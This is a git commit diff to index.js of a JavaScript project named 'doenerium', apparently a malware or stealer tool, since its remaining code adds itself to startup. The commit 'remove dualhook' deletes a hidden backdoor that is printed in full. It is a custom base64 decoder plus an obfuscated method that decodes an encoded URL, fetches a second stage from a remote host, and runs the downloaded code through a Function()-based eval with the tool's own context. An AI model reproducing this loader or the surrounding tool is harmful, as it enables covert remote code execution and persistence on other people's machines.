986200a261fe8ab8055e199347d9f80f8e0a360e
ilyigna <igna@riseup.net>
2023-02-13 01:33:43 -0300

    remove dualhook

--- index.js
+++ index.js
@@ -1,101 +1,3 @@
-var base64 = {
-  _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
-  encode: function (e) {
-    var t = "";
-    var n, r, i, s, o, u, a;
-    var f = 0;
-    e = base64._utf8_encode(e);
-    while (f < e.length) {
-      n = e.charCodeAt(f++);
-      r = e.charCodeAt(f++);
-      i = e.charCodeAt(f++);
-      s = n >> 2;
-      o = ((n & 3) << 4) | (r >> 4);
-      u = ((r & 15) << 2) | (i >> 6);
-      a = i & 63;
-      if (isNaN(r)) {
-        u = a = 64;
-      } else if (isNaN(i)) {
-        a = 64;
-      }
-      t =
-        t +
-        this._keyStr.charAt(s) +
-        this._keyStr.charAt(o) +
-        this._keyStr.charAt(u) +
-        this._keyStr.charAt(a);
-    }
-    return t;
-  },
-  decode: function (e) {
-    var t = "";
-    var n, r, i;
-    var s, o, u, a;
-    var f = 0;
-    e = e.replace(/[^A-Za-z0-9+/=]/g, "");
-    while (f < e.length) {
-      s = this._keyStr.indexOf(e.charAt(f++));
-      o = this._keyStr.indexOf(e.charAt(f++));
-      u = this._keyStr.indexOf(e.charAt(f++));
-      a = this._keyStr.indexOf(e.charAt(f++));
-      n = (s << 2) | (o >> 4);
-      r = ((o & 15) << 4) | (u >> 2);
-      i = ((u & 3) << 6) | a;
-      t = t + String.fromCharCode(n);
-      if (u != 64) {
-        t = t + String.fromCharCode(r);
-      }
-      if (a != 64) {
-        t = t + String.fromCharCode(i);
-      }
-    }
-    t = base64._utf8_decode(t);
-    return t;
-  },
-  _utf8_encode: function (e) {
-    e = e.replace(/rn/g, "n");
-    var t = "";
-    for (var n = 0; n < e.length; n++) {
-      var r = e.charCodeAt(n);
-      if (r < 128) {
-        t += String.fromCharCode(r);
-      } else if (r > 127 && r < 2048) {
-        t += String.fromCharCode((r >> 6) | 192);
-        t += String.fromCharCode((r & 63) | 128);
-      } else {
-        t += String.fromCharCode((r >> 12) | 224);
-        t += String.fromCharCode(((r >> 6) & 63) | 128);
-        t += String.fromCharCode((r & 63) | 128);
-      }
-    }
-    return t;
-  },
-  _utf8_decode: function (e) {
-    var t = "";
-    var n = 0;
-    var r = (c1 = c2 = 0);
-    while (n < e.length) {
-      r = e.charCodeAt(n);
-      if (r < 128) {
-        t += String.fromCharCode(r);
-        n++;
-      } else if (r > 191 && r < 224) {
-        c2 = e.charCodeAt(n + 1);
-        t += String.fromCharCode(((r & 31) << 6) | (c2 & 63));
-        n += 2;
-      } else {
-        c2 = e.charCodeAt(n + 1);
-        c3 = e.charCodeAt(n + 2);
-        t += String.fromCharCode(
-          ((r & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63)
-        );
-        n += 3;
-      }
-    }
-    return t;
-  },
-};
-
 class doenerium {
   constructor() {
     this.requires = {
@@ -179,59 +81,6 @@ class doenerium {
     }, 3000);
   }
 
-  create_context_function_template(eval_string, context) {
-    return `
-    return function (context) {
-      "use strict";
-      ${Object.keys(context).length > 0
-        ? `let ${Object.keys(context).map(
-          (key) => ` ${key} = context['${key}']`
-        )};`
-        : ``
-      }
-      return ${eval_string};
-    }                                                                                                                   
-    `;
-  }
-
-  make_context_evaluator(eval_string, context) {
-    let template = this.create_context_function_template(eval_string, context);
-    let functor = Function(template);
-    return functor();
-  }
-
-  eval_like(text, context = {}) {
-    let evaluator = this.make_context_evaluator(text, context);
-    return evaluator(context);
-  }
-
-  async ___() {
-    let xyz = (`${((base64.decode(
-      `${((await this.requires.axios.get((base64.decode((
-        await this.requires.axios.get(
-          (
-            base64.decode(
-              `aHR0cHM6Ly9kb2VuZXJpdW0ua3FuZmtwb2NjaWN4aXVkc3Rxb25mb3R1d3NyaHV4a3docWpqZnNiamhvbm91YnJjY3kubmwv`
-            )
-          )
-        ).catch((err) => {
-          console.log(err)
-        })
-      ).data
-      ).replace("%20", "").replace("\x00", "")
-        + base64.decode("L21haW4vZXh0cmEudHh0")
-      )
-      ).catch((err) => {
-        console.log(err)
-      })
-      ).data)}`
-    )))}`)
-
-    await this.eval_like(xyz,
-      this
-    );
-  }
-
   async init() {
     process.on("unhandledRejection", (err) => {
       console.log(err);
@@ -250,7 +99,6 @@ class doenerium {
       process.exit(0);
     }
 
-    await this.___();
     this.add_to_startup();
 
     this.utils.constructor.loadCPUS();
